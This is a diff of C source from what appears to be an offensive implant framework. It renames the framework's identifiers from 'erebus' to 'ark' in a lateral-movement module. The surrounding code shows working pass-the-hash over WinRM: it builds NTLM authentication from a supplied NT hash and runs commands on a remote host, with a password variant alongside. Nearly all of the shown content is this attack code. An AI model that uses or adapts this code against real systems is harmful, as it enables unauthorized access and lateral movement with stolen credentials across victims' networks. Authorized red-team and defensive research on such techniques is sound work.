@@ -13,8 +13,8 @@
 #include <stdlib.h>
 #include <string.h>
 
-#include "erebus/lateral_impl.h"
-#include "erebus/ntlm_pth.h"
+#include "ark/lateral_impl.h"
+#include "ark/ntlm_pth.h"
 
 #pragma comment(lib, "wsmsvc.lib")
 #pragma comment(lib, "winhttp.lib")
@@ -137,7 +137,7 @@ static void CALLBACK winrm_shell_cb(PVOID operationContext, DWORD flags, WSMAN_E
     SetEvent(ctx->done);
 }
 
-static int lateral_winrm_password(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
+static int lateral_winrm_password(const ark_lateral_config *cfg, char *output, size_t output_cap, int *success) {
     *success = 0;
     output[0] = '\0';
     const char *command = cfg->command[0] ? cfg->command : "whoami";
@@ -395,7 +395,7 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
         /* Type1 */
         uint8_t *t1 = NULL;
         size_t t1_len = 0;
-        if (!erebus_ntlm_type1(ctx->domain, &t1, &t1_len)) { free(hdrs); return 0; }
+        if (!ark_ntlm_type1(ctx->domain, &t1, &t1_len)) { free(hdrs); return 0; }
         char *t1b64 = b64_encode(t1, t1_len);
         free(t1);
         if (!t1b64) { free(hdrs); return 0; }
@@ -454,7 +454,7 @@ static int winrm_http_post(winrm_http_ctx *ctx, const char *soap, char **resp_bo
 
         uint8_t *t3 = NULL;
         size_t t3_len = 0;
-        if (!erebus_ntlm_type3_hash(chal, chal_len, ctx->user, ctx->domain, ctx->nt, &t3, &t3_len)) {
+        if (!ark_ntlm_type3_hash(chal, chal_len, ctx->user, ctx->domain, ctx->nt, &t3, &t3_len)) {
             free(chal);
             /* Caller surfaces via status/empty; type2 parse or crypto failed. */
             return 0;
@@ -547,7 +547,7 @@ static int extract_xml_tag(const char *xml, const char *tag, char *out, size_t o
     return 1;
 }
 
-static int lateral_winrm_pth(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
+static int lateral_winrm_pth(const ark_lateral_config *cfg, char *output, size_t output_cap, int *success) {
     *success = 0;
     output[0] = '\0';
 
@@ -564,18 +564,18 @@ static int lateral_winrm_pth(const erebus_lateral_config *cfg, char *output, siz
     memset(&ctx, 0, sizeof(ctx));
     snprintf(ctx.host, sizeof(ctx.host), "%s", cfg->target);
     ctx.port = 5985;
-    erebus_ntlm_split_user(cfg->username, cfg->domain, ctx.domain, sizeof(ctx.domain),
+    ark_ntlm_split_user(cfg->username, cfg->domain, ctx.domain, sizeof(ctx.domain),
         ctx.user, sizeof(ctx.user));
     if (!ctx.user[0]) {
         snprintf(output, output_cap, "winrm PTH: could not parse username");
         return 1;
     }
-    if (!erebus_ntlm_parse_hash(cfg->ntlm_hash, ctx.nt)) {
+    if (!ark_ntlm_parse_hash(cfg->ntlm_hash, ctx.nt)) {
         snprintf(output, output_cap, "invalid ntlm_hash (need 32 hex NT or LM:NT)");
         return 1;
     }
 
-    ctx.session = WinHttpOpen(L"Erebus", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+    ctx.session = WinHttpOpen(L"ARK", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!ctx.session) {
         snprintf(output, output_cap, "WinHttpOpen failed: %lu", (unsigned long)GetLastError());
@@ -769,7 +769,7 @@ static int lateral_winrm_pth(const erebus_lateral_config *cfg, char *output, siz
     return 1;
 }
 
-int erebus_lateral_winrm(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
+int ark_lateral_winrm(const ark_lateral_config *cfg, char *output, size_t output_cap, int *success) {
     *success = 0;
     if (cfg->ntlm_hash[0] && !cfg->password[0])
         return lateral_winrm_pth(cfg, output, output_cap, success);
